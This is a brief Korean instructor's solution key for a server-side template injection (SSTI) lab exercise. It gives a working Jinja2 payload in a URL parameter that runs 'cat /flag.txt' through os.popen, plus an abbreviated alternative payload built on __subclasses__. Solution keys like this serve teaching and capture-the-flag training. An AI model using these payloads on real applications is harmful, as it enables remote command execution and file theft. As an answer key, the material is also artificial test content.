# [강사용] SSTI 풀이
```
/?name={{cycler.__init__.__globals__.os.popen('cat /flag.txt').read()}}
```
또는 `{{ ''.__class__.__mro__[1].__subclasses__() ... popen('cat /flag.txt') }}`.
